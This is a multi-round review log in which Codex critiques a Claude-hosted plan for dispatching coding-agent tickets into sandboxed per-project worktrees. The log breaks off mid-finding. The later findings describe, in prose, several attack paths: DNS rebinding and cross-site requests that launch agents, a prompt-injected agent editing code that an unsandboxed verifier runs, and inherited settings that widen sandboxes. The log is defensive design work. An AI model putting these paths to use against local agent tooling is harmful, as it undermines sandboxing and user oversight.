# Review Log: Multi-Project Dispatch

## Setup — 2026-10-13
- Workflow: claudex-loop 2.2.2, mode=review (plan pre-existed; recon + targeted decisions only)
- Roles: host/planner = Claude Code (Opus 5.5); plan reviewer = Codex CLI (default model, default effort); builder = Claude (default); final inspector = fresh Codex session
- Authorization: plan review only. Build NOT authorized yet.
- Rounds: MAX_ROUNDS=5 (user budget choice). If round 5 does not converge, STOP and ask the user: (a) continue with cap 20, (b) cut scope and restart review, (c) lock plan with unresolved findings recorded under "Open Issues".
- Fallback: same-provider-on-unavailable (degraded assurance, recorded). Inspection: on.
- Privacy: repo is public. No project names, paths, client names or data in this log or the plan.

## Host recon findings folded into the plan before round 1
1. Linear comments carry up to 3000 chars of agent output + error text (`runner/modules/linear/__init__.py:208`) → confidential redaction must be code-enforced (Decision 4).
2. Git worktrees lack gitignored test inputs (one pilot's tests read gitignored `data/`/`results/`); one pilot has only `.gitignore` tracked → user chose worktree + `cp -R` seed list; untracked verify target ⇒ refuse (Decision 1).
3. `cwd=ROOT` is hardcoded in auto-dispatch, routing, retry/rework, `/run`, `/stream` → single launch helper (Decision 3a).
4. Poller filters one `project_slug` → route by label `project:<key>` (Decision 3).
5. Claude title field is `ai-title`, not `summary`; slug dir can be missing; `sdk-*` sessions are most of the sessions → match by JSONL `cwd`, exclude sdk.
6. Codex threads: `exec` + subagent threads outnumber cli/vscode ~5:1 → filter `source IN ('cli','vscode')`, archived=0.
7. Reuse `usage_reader._cached_by_stat`; new logic in `runner/projects.py` (no `run_skill.py` namespace overload).

## User decisions (2026-10-13)
- Run location: per-ticket worktree, `seed:` copied not symlinked, branch `agent/<ticket>`, manual merge = accept, cleanup = reject, parallel worktrees allowed, main checkout never touched.
- UI: replace skill stacks with project sections; knowledge base registered as a project (confidential false, no_push true, verify `git diff --check`); KB skills via ticket prompts; skill registry build kept for CLI.
- Other plans triaged: P24 → completed/; P15, P20, P23 → new `docs/exec-plans/deferred/` (frontmatter `status: deferred`); `state/roadmap.json` + ROADMAP.md re-rendered.

## Baseline
- `.venv/bin/python -m pytest tests/ -q` → 54 passed (2026-10-13)

## Round 1 — Codex (2026-10-13)
- Result: `<session-scratchpad>/claudex/r1/result.json`
- Session: 01a1376d-8256-72f0-bfa4-30436136ae98 · codex-cli 0.162.0 · model: CLI default (observed: unknown) · assurance: cross_provider · plan sha256 fe0dc983…
- Verdict: **REVISE** (7 high, 4 medium)

```json
{
 "verdict": "REVISE",
 "summary": "The plan hash matches the supplied SHA256. Static review found material gaps in confidentiality, worktree isolation, retry identity, concurrency, session discovery, and verification/review handling.",
 "findings": [
  {
   "id": "MPD-01",
   "severity": "high",
   "path": "docs/exec-plans/active/2026-10-13-multi-project-dispatch.md:29",
   "evidence": "Confidential comments allow a verify summary, while line 43 defines that summary as the last non-empty output line. A failing verifier can end with a private filename, client identifier, assertion value, or traceback. Posting that line violates the prohibition on error text, filenames, and confidential data.",
   "fix": "Generate confidential summaries from trusted structured fields, such as exit code, duration, and a fixed pass/fail message. Keep raw verifier output local. Include sensitive verifier-output cases in the redaction checks."
  },
  {
   "id": "MPD-02",
   "severity": "high",
   "path": "runner/app.py:2995",
   "evidence": "Retry posts Human Feedback through the existing comment builder before launching the agent. Reply text and attachment filenames/paths are sent to Linear independently of the eventual run-result comment. Replacing only the result builder therefore still leaks confidential rework feedback.",
   "fix": "Resolve confidentiality before any retry comment is posted. Keep confidential feedback and attachments local, and enforce the permitted payload at every automatic comment call site, including retry, failure, and timeout paths."
  },
  {
   "id": "MPD-03",
   "severity": "high",
   "path": "docs/exec-plans/active/2026-10-13-multi-project-dispatch.md:24",
   "evidence": "Recursive copying does not guarantee link-free seeds. A seed directory containing a symlink to a main-checkout file can retain that symlink in the copy; an agent writing through it modifies the original. The proposed existence check and ordinary copy test do not cover this case.",
   "fix": "Define and enforce a recursive symlink policy before dispatch. Reject links escaping the allowed seed source or materialize permitted targets as independent files. Validate relative source/destination containment and cover nested symlinks and traversal paths."
  },
  {
   "id": "MPD-04",
   "severity": "high",
   "path": "runner/run_skill.py:117",
   "evidence": "Changing the outer subprocess cwd does not control nested execution. /run and retry still select run_skill.py for executable skills; run_once resolves the entrypoint against its own ROOT and launches at ROOT. Separately, direct DeepSeek launches use workspace=ROOT, and deepseek_agent.py shell tools have no per-run env parameter. The proposed cwd/env helper alone cannot satisfy all project launch paths.",
   "fix": "Explicitly bypass the legacy skill runner for project-ticket execution or make its execution context project-aware. Thread worktree and environment through direct DeepSeek tools without mutating process-global environment. Cover executable-skill and direct-API launch paths."
  },
  {
   "id": "MPD-05",
   "severity": "high",
   "path": "runner/app.py:122",
   "evidence": "RUN_LOG defaults to the knowledge-base main checkout's outputs/run_log.jsonl, and _write_run_log appends full prompts, output, and errors there. Registering the knowledge base as a project therefore leaves AgenticOS writing to a project's main checkout and deposits other projects' confidential output there. The plan also explicitly runs verify in the main checkout when --worktree is omitted; ordinary verifiers can create or modify files.",
   "fix": "Store project-run records in runner-owned state outside registered project checkouts and update readers and lifecycle writers consistently. Require an owned worktree for project verification instead of defaulting to the main checkout."
  },
  {
   "id": "MPD-06",
   "severity": "high",
   "path": "runner/app.py:2962",
   "evidence": "The retry running guard executes pass, so two retry requests for the same ticket can both start. The new design reuses that ticket's worktree and branch, allowing concurrent edits, commits, and verification against changing files. Linear dispatch also uses a non-atomic check followed by registration.",
   "fix": "Add an atomic per-ticket reservation covering worktree creation/reuse, execution, verification, and cleanup. Reject overlapping launches for the same ticket while allowing different tickets in one project to run concurrently."
  },
  {
   "id": "MPD-07",
   "severity": "high",
   "path": "runner/app.py:1838",
   "evidence": "Run records contain no project key, worktree path, issue identifier, or original base SHA. Retry reconstructs execution from the run log and linear_issue_id. If a label changes or disappears between attempts, resolving the current label can send rework to another project or legacy cwd and apply the wrong confidentiality policy. A moving project HEAD also cannot reconstruct the original review base.",
   "fix": "Persist the initial project/worktree binding and base SHA with the task, and preserve them through retries, verification records, archive, and restore. Fail closed when that binding is unavailable or mismatched; never silently fall back to legacy dispatch."
  },
  {
   "id": "MPD-08",
   "severity": "medium",
   "path": "docs/exec-plans/active/2026-10-13-multi-project-dispatch.md:49",
   "evidence": "Claude candidate discovery searches only the main project's slug prefix. A session launched in ~/.agentic-os/worktrees/example/TEST-1 has an unrelated directory slug and is never inspected, despite the later cwd filter allowing worktrees. Parent-directory sessions acknowledged by the plan are also excluded before filtering.",
   "fix": "Enumerate all relevant Claude session directories, including worktree and ancestor locations, or scan session metadata globally with the existing stat cache. Apply canonical cwd-boundary filtering afterward."
  },
  {
   "id": "MPD-09",
   "severity": "medium",
   "path": "docs/exec-plans/active/2026-10-13-multi-project-dispatch.md:34",
   "evidence": "Agents are instructed to commit before review, but the knowledge-base verifier is bare git diff --check. Once a trailing-whitespace change is committed, that command sees a clean working tree and succeeds without checking the ticket's committed changes.",
   "fix": "Make whitespace verification compare against the persisted worktree base SHA and account for remaining staged and unstaged changes. Compute review shortstat against that same immutable base."
  },
  {
   "id": "MPD-10",
   "severity": "medium",
   "path": "runner/templates/index.html:1386",
   "evidence": "The plan sends verify failures to Human Review, but the current board has no Human Review column. It derives project-ticket placement from Linear state and only overrides that placement for latest status=review. Backend/local tracker mappings likewise have no failed/error/timeout review destination. Merely logging a verify failure will not produce the promised review state.",
   "fix": "Specify the failure representation and implement it consistently in board projection, backend mappings, local tracker handling, and polling. Preserve verification failure locally without requiring an unavailable Linear workflow state."
  },
  {
   "id": "MPD-11",
   "severity": "medium",
   "path": "runner/app.py:1929",
   "evidence": "Parallel project completions use _write_run_log, which performs unlocked read-modify-write updates and direct write_text calls for task_state.json and job_state.json. Two completions can overwrite each other's state, and interrupted writes can leave invalid JSON. LocalTracker's save lock also excludes the preceding read-modify phase. This undermines the planned parallel execution and SPEC.md FR-17/NFR-02.",
   "fix": "Serialize each complete shared-state read-modify-write transaction and use atomic replacement for JSON snapshots. Ensure dashboard and projects.py writers share the same synchronization protocol."
  }
 ],
 "coverage": [
  "Read the on-disk plan and verified SHA256 fe0dc983d706bec2e8682d543a7ffb22cf09ca3019f8a42fdf3a476c9b8c6694.",
  "Inspected projects.example.yaml and the registry ignore rule.",
  "Traced /run, /stream, retry/resume, run logging, status/archive handling, and run readers in runner/app.py.",
  "Traced Linear dispatch, polling, comments, cache synchronization, state mappings, and local tracker writers.",
  "Inspected Linear API queries, label normalization, and workflow-state resolution.",
  "Traced nested execution in run_skill.py and direct DeepSeek workspace/environment handling.",
  "Inspected dashboard board projection, session-file caching, relevant existing test sources, and applicable SPEC.md lifecycle and concurrency requirements."
 ],
 "limitations": [
  "runner/projects.py and tests/test_projects.py do not yet exist; this reviews the plan against current implementation, not completed feature code.",
  "No tests, agent launches, verification commands, or cleanup operations were run. The stated 54-test baseline was not verified.",
  "Private registry entries, project repositories, and real Claude/Codex session stores were not inspected; pilot readiness and upstream format compatibility remain unverified.",
  "No files were edited and no work was delegated."
 ]
}
```

### Host dispositions
Round 1 dispositions (host = Claude). All 11 findings evidence-checked against code; all accepted, fixed minimally:
- MPD-01 accepted: confidential comment = fixed template (status, verify pass|fail + exit + duration, shortstat counts). Verify output tail is local only (Decision 2, 4).
- MPD-02 accepted: single `tracker_comment` gate at every automatic comment call site incl. retry Human Feedback; confidential feedback/attachments not posted (Decision 4).
- MPD-03 accepted: seed paths relative + containment check; copy with shutil.copytree(symlinks=False)/copy2 (dereference); dangling link => fail; tests for nested/file links and traversal (Decision 1, Phase 0 tests).
- MPD-04 accepted: project tickets always launch agent CLI via _ai_command, never run_skill.py entrypoints; direct-API `deepseek` backend rejected for project tickets instead of threading env through deepseek_agent.py (Decision 3a).
- MPD-05 accepted: confidential run records -> runner-owned outputs/project_runs/<run_id>.json, redacted record to RUN_LOG (Decision 4a); verify requires --worktree (Decision 2).
- MPD-06 accepted: in-process per-ticket reservation (lock-guarded set) across create/run/verify/cleanup (Decision 1). Single Flask process, so in-process is sufficient.
- MPD-07 accepted: binding {project_key, issue_identifier, worktree, branch, base_sha} persisted on first run record; retry/verify/archive/restore read it; fail closed (Decision 1).
- MPD-08 partially accepted: worktree root slug added to candidate dirs. Ancestor/parent-dir sessions rejected on purpose: they are not project sessions, and `claude --resume` lists by exact directory; plan text corrected.
- MPD-09 accepted: KB verify `git diff --check {base}`; `{base}` placeholder; shortstat vs base_sha.
- MPD-10 accepted: no new state (run-status set is closed per AGENTS.md); project runs end in existing `review`/In Review with an additive verify badge; failures sort first (Decision 8).
- MPD-11 accepted: module-level lock around shared-state RMW + tmp/os.replace (Decision 4b) + concurrency test.
Also added (host): main-checkout guard — agents are unsandboxed, so pre/post `git status --porcelain` diff on the main checkout is detected and forces verify fail.

## Round 2 — Codex (2026-10-13)
- Result: `<session-scratchpad>/claudex/r2/result.json`
- Session resumed 01a1376d… · plan sha256 2d3bdb16… · assurance cross_provider
- Verdict: **REVISE** (6 high, 1 medium)

```json
{
 "verdict": "REVISE",
 "summary": "The revised plan hash matches. Most prior findings are addressed at the plan level, but concrete gaps remain in confidential replay, change detection, cross-process coordination, process cleanup, and seed handling.",
 "findings": [
  {
   "id": "MPD-12",
   "severity": "high",
   "path": "runner/app.py:2915",
   "evidence": "Decision 4a replaces confidential prompt/output/error in RUN_LOG with '[local]' and updates only the run-detail reader. Retry reads RUN_LOG directly and builds its prompt from those fields, so confidential rework receives '[local]' instead of the original task and output. api_run_history likewise reads RUN_LOG directly, hiding previous attempts from local review.",
   "fix": "Use a shared payload-loading helper for detail, retry, and history. Rehydrate private payload fields while preserving the latest log record's lifecycle metadata. Refuse replay when a required side file is missing."
  },
  {
   "id": "MPD-13",
   "severity": "high",
   "path": "docs/exec-plans/active/2026-10-13-multi-project-dispatch.md:27",
   "evidence": "The new guard compares porcelain status strings, which do not identify file contents or HEAD. Modifying an already-dirty file leaves the same ' M filename' entry; committing a main-checkout change can leave both snapshots empty; ignored-file writes are omitted. These mutations therefore pass the proposed detector.",
   "fix": "Compare HEAD, index state, and content fingerprints for tracked files and relevant untracked/ignored data. Treat snapshot failures as verification failures and describe the guard's remaining detection limits accurately."
  },
  {
   "id": "MPD-14",
   "severity": "high",
   "path": "docs/exec-plans/active/2026-10-13-multi-project-dispatch.md:23",
   "evidence": "The reservation is explicitly in-process, but worktree, verify, and cleanup are also standalone CLI commands. Running projects.py cleanup while Flask owns a ticket cannot see Flask's reserved set and can remove the active worktree. A separate CLI verification can also inspect files while the agent changes them.",
   "fix": "Use a shared per-ticket filesystem lock for dashboard execution and CLI worktree/verify/cleanup operations, or route those operations through the owning server. Keep different tickets independently runnable."
  },
  {
   "id": "MPD-15",
   "severity": "medium",
   "path": "runner/run_skill.py:96",
   "evidence": "Decision 4b assumes a Flask lock is sufficient because projects.py does not write shared snapshots. However, retained legacy launches invoke run_skill.py in another process, and its _update_state reads and replaces the same outputs/job_state.json. Concurrent project and legacy completions can still overwrite each other's entries; a shared fixed temporary filename can also collide.",
   "fix": "Coordinate every job_state.json writer with a cross-process transaction lock and unique temporary files, including run_skill.py. Preserve the in-process protection for runner-only snapshots."
  },
  {
   "id": "MPD-16",
   "severity": "high",
   "path": "runner/app.py:2885",
   "evidence": "Cancellation and timeout handling terminate only the agent process; current launchers do not establish and terminate an owned process group. An agent-spawned build or shell can survive, keep writing the worktree, and overlap verification or a later retry after the ticket reservation is released.",
   "fix": "Define process-tree ownership for project agents and verifiers. Terminate and reap owned child processes on cancellation/timeout before verifying, cleaning up, or releasing the ticket reservation."
  },
  {
   "id": "MPD-17",
   "severity": "high",
   "path": "docs/exec-plans/active/2026-10-13-multi-project-dispatch.md:24",
   "evidence": "Source containment does not ensure destination containment. For example, HEAD can contain a directory symlink while the main checkout has replaced it with a real directory containing an ignored seed. The source resolves inside the root, but the fresh worktree restores the directory symlink; copying the nested seed follows that destination link and writes outside the worktree.",
   "fix": "Validate every destination ancestor against the owned worktree before copying. Reject symlinked destination components and collisions with tracked paths; apply the same ownership checks when reusing a worktree."
  },
  {
   "id": "MPD-18",
   "severity": "high",
   "path": "docs/exec-plans/active/2026-10-13-multi-project-dispatch.md:24",
   "evidence": "The plan checks seed existence but does not establish that seeds are ignored in the fresh worktree. If the main checkout's uncommitted .gitignore ignores data/, while HEAD does not, the copied data becomes ordinary untracked files in the worktree. The instructed agent can include it with git add -A; deleting the worktree and branch does not remove those confidential contents from Git objects.",
   "fix": "Require seeds to be ignored by the destination worktree's committed configuration before dispatch, and reject staged seed paths before accepting an agent commit for review. Cover a source-only, uncommitted ignore rule."
  }
 ],
 "coverage": [
  "Read the revised on-disk plan and verified SHA256 2d3bdb1601bbdd7b9008a5bf48352f1bf5a11b72e400d4236c683f4bc17db4a3.",
  "Compared all eleven prior findings with the host dispositions; accepted the revised comment gate, CLI-only dispatch, persisted binding, session candidates, base-relative verification, and existing review-state design.",
  "Traced run detail, retry, history, cancellation, timeout, archive/restore, logging, and snapshot readers/writers in runner/app.py.",
  "Traced the separate job_state.json writer in run_skill.py and Linear/local tracker synchronization paths.",
  "Inspected dashboard history consumption, board projection, registry example, ignore rules, and relevant SPEC.md lifecycle requirements."
 ],
 "limitations": [
  "runner/projects.py and its proposed tests are not present; this is a plan review against existing integration paths.",
  "No files were edited, tests or project commands were run, or work delegated. The stated test baseline was not verified.",
  "Private registries, pilot repositories, live session stores, and launchd execution were not inspected."
 ]
}
```

### Host dispositions
Round 2 dispositions (host = Claude). All 7 accepted with minimal fixes:
- MPD-12 accepted: shared `load_run_payload(run_id)` used by detail, retry prompt building and history; missing side file => detail notice + retry refused (Decision 4a).
- MPD-13 accepted: fingerprint = HEAD + sha256(diff --cached --binary) + sha256(diff --binary) + (path,size,mtime_ns) of untracked/ignored files; snapshot error => fail; remaining limit documented (Decision 1 guard).
- MPD-14 accepted: replaced in-process set with per-ticket fcntl.flock file lock shared by dashboard and all projects.py subcommands (Decision 1).
- MPD-15 accepted: cross-process flock + mkstemp/os.replace for every job_state/task_state RMW incl. run_skill.py (Decision 4b).
- MPD-16 accepted: start_new_session + killpg SIGTERM→SIGKILL, reaped before verify/cleanup/lock release (Decision 1).
- MPD-17 accepted: destination must not exist, no symlink ancestors, rechecked on reuse (Decision 1).
- MPD-18 accepted: seeds must be ignored by worktree's committed rules (check-ignore in worktree); seed path in base..HEAD => `seed committed` fail (Decision 1).
Host addition: explicit Threat Model section. Scope is accident prevention/detection for a single-user localhost tool with trusted-but-unsandboxed agents; containing a hostile agent is a non-goal. Please judge remaining findings against that model and flag only material defects within it.

## Round 3 — Codex (2026-10-13)
- Result: `<session-scratchpad>/claudex/r3/result.json`
- Session resumed 01a1376d… · plan sha256 218a72d1… · assurance cross_provider
- Verdict: **REVISE** (1 high, 1 medium)

```json
{
 "verdict": "REVISE",
 "summary": "The plan hash matches. Prior finding scenarios now have explicit plan-level remedies. Two material integration defects remain within the stated accident-focused threat model.",
 "findings": [
  {
   "id": "MPD-19",
   "severity": "medium",
   "path": "docs/exec-plans/active/2026-10-13-multi-project-dispatch.md:34",
   "evidence": "The expanded fingerprint includes ignored files in the knowledge-base main checkout. RUN_LOG defaults to that checkout (runner/app.py:122), and completions, archive, and restore append there (lines 1896, 2837, 2873). During a knowledge-base ticket, another project's completion changes this file's size/mtime, falsely producing 'main checkout changed' even when both agents stayed in their worktrees. Confidential redaction does not prevent this mutation.",
   "fix": "Move runner-maintained logs outside registered project checkouts and update their readers/writers consistently, or distinguish precisely identified runner bookkeeping writes from project mutations. Cover concurrent knowledge-base and other-project runs."
  },
  {
   "id": "MPD-20",
   "severity": "high",
   "path": "docs/exec-plans/active/2026-10-13-multi-project-dispatch.md:35",
   "evidence": "Process-group cleanup is specified only for cancellation and timeout. A trusted agent can start a background development server or watcher with redirected output, then exit successfully while that child remains alive. Existing success paths discard the process handle after parent completion (runner/modules/linear/__init__.py:644-651; runner/app.py:3089-3090). The child can mutate files during verification or after lock release, overlapping the next retry.",
   "fix": "Handle remaining owned descendants on normal completion and error paths as well. Retain the ticket lock until those processes are stopped; apply this lifecycle rule to verifier children too. Cover a successful fake agent that leaves a background writer."
  }
 ],
 "coverage": [
  "Read the on-disk plan and verified SHA256 218a72d15051a313c9720cc2042c79a8e6751228632ce45f855ffe684cc4ee5f.",
  "Checked all prior findings against the revised decisions and host dispositions without reopening their resolved scenarios.",
  "Traced run logging, detail, retry/history, archive/restore, cancellation, and successful process completion in runner/app.py and the Linear module.",
  "Inspected shared snapshot writers in run_skill.py, Linear/local tracker synchronization, dashboard board/history consumers, registry example, ignore rules, session caching, and relevant specification excerpts."
 ],
 "limitations": [
  "runner/projects.py and its proposed tests are absent; this reviews the plan against existing integration paths.",
  "No files were edited, tests or project executions were run, or work delegated. The stated test baseline was not verified.",
  "Private registries, pilot repositories, live session stores, and launchd behavior were not inspected."
 ]
}
```

### Host dispositions
Round 3 dispositions (host = Claude). Both accepted:
- MPD-19 accepted (exclusion variant): fingerprint excludes runner bookkeeping paths computed at runtime = files AgenticOS writes inside that checkout; today only RUN_LOG (+ .lock) in the knowledge-base checkout (verified: app.py only reads WIKI_LOG; run_skill.py's RUN_LOG lives in agentic-os outputs/). Moving RUN_LOG was rejected: it is the knowledge base's memory-layer artifact by workspace contract. Test added.
- MPD-20 accepted: killpg SIGTERM→SIGKILL on every exit path (incl. success/error) for agent and verify groups, reaped before verify/cleanup/lock release. Test with a fake agent that exits 0 leaving a background writer.

## Round 4 — Codex (2026-10-13)
- Result: `<session-scratchpad>/claudex/r4/result.json`
- Session resumed 01a1376d… · assurance cross_provider
- Verdict: **APPROVED** — bound to plan sha256 d47d5aa94ef541f3e92069d5897c788112b576330a7a20f4ada66cc1a16cfc8c

```json
{
 "verdict": "APPROVED",
 "summary": "Approved as an implementation plan within the stated threat model. Prior findings are addressed, including bookkeeping exclusions and process-group cleanup on every exit path. No additional material unresolved defects were identified.",
 "findings": [],
 "coverage": [
  "Read the revised plan and verified SHA256 d47d5aa94ef541f3e92069d5897c788112b576330a7a20f4ada66cc1a16cfc8c.",
  "Checked the revision against all prior findings and host dispositions.",
  "Traced dispatch, successful completion, cancellation, retry/history, payload readers, logging, archive/restore, and shared snapshot writers in app.py, run_skill.py, and Linear integration code.",
  "Confirmed RUN_LOG write paths and read-only WIKI_LOG usage against the proposed fingerprint exclusions.",
  "Reviewed related local tracker synchronization, dashboard consumers, Linear label normalization, and session caching."
 ],
 "limitations": [
  "This approves the plan, not an implemented feature; runner/projects.py and its proposed tests are absent.",
  "No files were edited, tests or project executions were run, or work delegated. The stated test baseline was not verified.",
  "Private registries, pilot repositories, live session formats, and launchd behavior were not inspected."
 ]
}
```

## Status
- Plan approved in 4/5 rounds (20 findings total: 18 accepted, MPD-08 partial, MPD-19 accepted via exclusion variant).
- Remaining limits: plan-level approval only; reviewer did not run tests or inspect private registry/pilot repos/live session stores/launchd.
- Build: NOT yet authorized. Awaiting user sign-off.

## Post-approval amendment — host (2026-10-14), NOT YET REVIEWED
- User asked why sandboxing was a non-goal. Host found that the "unsandboxed" choice also left confidential projects open to prompt-injected writes outside the worktree and to shell network egress, while both CLIs ship a built-in sandbox.
- Added Decision 9: confidential bindings run under the CLI's built-in sandbox, and backends fail closed if the sandbox can't be verified. The Threat Model, the main-checkout guard wording, Phase 0 (sandbox spike), Phase 2 (implementation and tests) and Risks were updated.
- Verified flags: `codex exec --sandbox workspace-write` and `--add-dir` (codex-cli 0.162.0). The Claude sandbox settings keys are unverified, so the spike decides.
- New plan sha256: 6717eb0bbee325021087b74a22da380cbb1e2e1dff3b91e430aede31aae66000. **The Round 4 APPROVED (d47d5aa9…) no longer covers this plan.** Re-review before build, as the user directed (write now, review later).
- 2026-10-14 follow-up (user decision): Codex approval pinned to `-c 'approval_policy="never"'`. `codex exec` rejects `-a` (verified locally), so the policy goes through a config override. A test asserts it appears in argv. Plan sha256 is now ca3d0492972791b02f063a37db2a4113ee4808b45fd299acc22e42e01f8a03d4; still NOT YET REVIEWED.
- 2026-10-14 follow-up (user decision): non-confidential Codex project runs use `--sandbox workspace-write --approve-for-me` (auto-review) instead of full bypass. Confidential runs keep `approval_policy="never"`. The two cannot be combined, and auto-review is documented as "not a deterministic security guarantee". Spike check (f) was added; if it fails, the runs fall back to today's bypass. Source: https://learn.chatgpt.com/codex/sandboxing/auto-review. Plan sha256 is now 37221887d8fa0add19cd10df31b2e2ce910f93d0e4b5632b2877078f289a30d5; still NOT YET REVIEWED.
- 2026-10-14 follow-up (user request, NOT to be sent to review yet):
  - Added Decision 10, multi-terminal tabs. Terminals are server-owned with `term_id`, so they survive detach and reload and are killed by process group. There are two tab kinds: an interactive `shell` per project or worktree, and a read-only `run` view of a headless dispatched run that offers "Resume in tab" once the run ends.
  - Added Phase 3, plus acceptance criteria, constraint and risk entries.
  - Also recorded a pre-existing hole: `cors_allowed_origins="*"` at runner/app.py:149 lets any web page drive the PTY over cross-site WebSocket. The fix is scheduled first in Phase 3.
  - Checked Chase's 04–09 transcripts. His "tabs" are report tabs (audience, research), plus one terminal inside Obsidian. He shows no multi-terminal tabs.
  - Plan sha256 is now aab04e82717f8d337f78311594df25307ee0c043d2f7801ce7422d72e8537321. NOT YET REVIEWED.
- 2026-10-14 follow-up: Decisions 3a and 9 now cross-reference the new plan `2026-10-14-dsh-backend-swap.md` (DeepSeek → `dsh`). Plan sha256 is now d51cd77364c9adb051cde91ea818f98dd877f4135fb00d3460738afbaab76888. NOT YET REVIEWED.
- 2026-10-14 follow-up (user request): the CORS hole is now its own "Security Precondition" section, with the attack path, the fix (an origin allow-list from --host/--port), the PNA caveat and a verification method. It is the first item in Phase 0, with an acceptance criterion; Decision 10 points to it. Plan sha256 is now b7618d682852dd58461cf8d90067d6baced775e4cbbed1f50e347a049ece3bcd. NOT YET REVIEWED.

## Round 5 — Codex (2026-10-14), plan sha256 b7618d68…
- Scope: all post-approval amendments (Decision 9, Codex approval/auto-review, Decision 10/Phase 3, dsh cross-refs, Socket.IO origin precondition). Feedback file: `<session-scratchpad>/claudex/feedback-r5.md`. Resumed the Round 4 session 01a1376d…; CLI default model and effort.
- Host pre-check, before launch: python-engineio 4.13.1 with `cors_allowed_origins=None` derives the allowed origin from the request's Host header, so just deleting `"*"` would let a DNS-rebinding page through; the explicit list avoids that. Open concern: DNS rebinding also reaches the plain Flask HTTP routes (POST /run), which have no Host check.
- Attempt 1 (`r5/claudex-v10l5uf6`): runner timed out after 600 s. It was recorded as `provider_unavailable`/`fallback_eligible`, but stdout showed Codex actively working (17 items, a partial finding). Host decision: the cause is the scope/timeout, not provider availability, so no same-provider fallback. Retried Codex with `--timeout 1800` (`r5b/`).
- Attempt 2 (`r5b/claudex-8kze8h0d`): completed in 206 s, resumed session 01a1376d…, assurance cross_provider, observed model: unknown. Verdict **REVISE** (6 high, 8 medium).
```json
{
 "verdict": "REVISE",
 "summary": "The supplied hash matches. The previously approved safeguards remain addressed, but the post-approval amendments introduce material security and lifecycle gaps. The Socket.IO allow-list is sound for that transport; the precondition must also cover HTTP Host validation and cross-site requests. Sandbox configuration, verification, interactive resume, terminal reattachment, and dsh integration need revisions.",
 "findings": [
  {
   "id": "MPD-21",
   "severity": "high",
   "path": "docs/exec-plans/active/2026-10-13-multi-project-dispatch.md:35",
   "evidence": "The proposed Origin allow-list protects Engine.IO, not ordinary Flask routes. Flask-SocketIO installs middleware that handles Socket.IO separately. Flask currently has no Host restriction. After DNS rebinding, a page at an attacker-controlled host can make same-origin application/json requests to POST /run, whose default Claude command uses bypassPermissions. It can also read local API responses. Installed Flask 3.1.3 defaults TRUSTED_HOSTS to None. [Flask Host validation documentation](https://flask.palletsprojects.com/en/stable/web-security/#host-header-validation).",
   "fix": "Add an explicit HTTP Host allow-list alongside the Socket.IO Origin list, derived from configured access names rather than request headers. Use TRUSTED_HOSTS or equivalent validation before route execution. Cover foreign Host requests to /run and sensitive read endpoints, including requests without Origin."
  },
  {
   "id": "MPD-22",
   "severity": "high",
   "path": "runner/app.py:2634",
   "evidence": "GET /stream accepts a prompt in its query string and starts an agent. A malicious page can send a simple cross-origin GET without a JSON preflight; preventing response reads does not prevent dispatch. Host validation alone also permits this request because its target Host is legitimately 127.0.0.1. Multipart POSTs to /upload, /api/board/upload, and /api/stt similarly permit unwanted file writes or provider usage. The proposed Socket.IO-only precondition leaves these paths open.",
   "fix": "Expand the precondition to browser-request validation for HTTP side effects. Require a same-origin proof or CSRF token for dispatch, uploads, and STT, including handling requests with no Origin. Prefer POST for dispatching streams. Verify rejected requests cause no agent launch, file write, or provider call."
  },
  {
   "id": "MPD-23",
   "severity": "medium",
   "path": "docs/exec-plans/active/2026-10-13-multi-project-dispatch.md:76",
   "evidence": "The non-confidential command combines --sandbox workspace-write with --approve-for-me. The current official CLI reference documents those flags as conflicting; --approve-for-me already selects workspace-write and on-request approvals. The proposed combination can fail before execution and unnecessarily trigger the permitted bypass fallback. Its codex exec behavior is also documented now. [Codex CLI reference](https://learn.chatgpt.com/docs/developer-commands?surface=cli).",
   "fix": "Use --approve-for-me without the conflicting --sandbox flag, or an explicitly supported configuration combination. Update spike (f), argv checks, and the documentation claim. Distinguish malformed argv from genuine unsupported auto-review behavior before choosing a fallback."
  },
  {
   "id": "MPD-24",
   "severity": "high",
   "path": "docs/exec-plans/active/2026-10-13-multi-project-dispatch.md:85",
   "evidence": "Pinning sandbox mode and approval_policy does not pin the complete confidential policy. Codex inherits configuration that can enable sandbox_workspace_write.network_access or add writable_roots. Claude can fall back when sandboxing is unavailable, retry unsandboxed, or inherit excludedCommands and expanded permissions. A successful initial spike does not prevent later configuration changes from widening access without a CLI upgrade. [Codex configuration](https://learn.chatgpt.com/docs/config-file/config-reference), [Claude sandbox configuration](https://code.claude.com/docs/en/sandboxing).",
   "fix": "Define and enforce the effective per-run policy. Explicitly disable Codex shell network and constrain additional writable roots. For Claude, require failIfUnavailable, disable unsandboxed retries, and reject or neutralize inherited sandbox exceptions. Validate the resolved configuration, not only argv, and include permissive inherited settings in the spike cases."
  },
  {
   "id": "MPD-25",
   "severity": "high",
   "path": "docs/exec-plans/active/2026-10-13-multi-project-dispatch.md:92",
   "evidence": "Automatic verification executes outside the sandbox after the agent edits the worktree. Prompt injection can therefore cause the agent to modify a test or imported application module that the verifier subsequently executes. That code can perform network calls or write outside the worktree with the runner's privileges. Requiring the verify target to exist at HEAD does not ensure its executed contents and dependencies remain trusted.",
   "fix": "Apply the confidential execution boundary to verification too, or require an explicit review gate before executing agent-modified code outside it. Include a verifier that attempts an external write and network call through an edited test dependency."
  },
  {
   "id": "MPD-26",
   "severity": "high",
   "path": "docs/exec-plans/active/2026-10-13-multi-project-dispatch.md:106",
   "evidence": "Resume in tab launches plain claude --resume or codex resume commands. The contract does not carry forward the confidential binding, Claude per-run settings, pinned Codex policy, git-directory permissions, or backend eligibility gate. Thus a backend rejected for confidential headless dispatch can still be automatically launched through this new resume path with ordinary user defaults.",
   "fix": "Build interactive resume commands through a binding-aware policy builder and apply confidential eligibility checks there. Preserve the required sandbox settings and writable roots. Distinguish a user's manually entered shell command from an agent command automatically launched by the dashboard."
  },
  {
   "id": "MPD-27",
   "severity": "medium",
   "path": "docs/exec-plans/active/2026-10-13-multi-project-dispatch.md:103",
   "evidence": "Bound-worktree shell tabs introduce another writer, but the ticket lock is specified only for dashboard dispatch and projects.py commands. After a run ends, an interactive resume can edit its worktree while a retry acquires the available lock; cleanup can likewise remove a worktree still used by the terminal. Preventing concurrent resume of the same session does not prevent a different agent session from writing the same ticket.",
   "fix": "Define ownership for interactive bound-worktree terminals. Coordinate mutating shell/resume activity with the same ticket lock and reject or explicitly resolve retry/cleanup conflicts. Read-only run tabs should not acquire a mutation lease."
  },
  {
   "id": "MPD-28",
   "severity": "medium",
   "path": "docs/exec-plans/active/2026-10-13-multi-project-dispatch.md:100",
